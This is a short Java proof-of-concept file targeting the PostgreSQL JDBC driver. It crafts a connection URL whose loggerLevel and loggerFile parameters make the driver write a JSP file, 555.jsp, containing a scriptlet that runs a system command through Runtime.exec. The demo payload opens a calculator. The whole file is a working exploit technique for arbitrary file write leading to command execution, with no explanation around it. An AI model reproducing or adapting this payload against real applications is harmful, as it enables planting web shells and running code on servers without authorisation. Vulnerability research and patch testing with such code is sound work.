package org.example.JDBC_Client;


import org.postgresql.Driver;

import java.sql.Connection;
import java.sql.DriverManager;

public class PostgreSQL_FileWrite_Client {

    public static void main(String[] args) throws Exception {
        String URL = "jdbc:postgresql://127.0.0.1:11111/test/?loggerLevel=DEBUG&loggerFile=555.jsp&<%Runtime.getRuntime().exec(\"open -a calculator\")};%> =\n";
        DriverManager.registerDriver(new Driver());
        Connection connection = DriverManager.getConnection(URL);
        connection.close();
    }
}
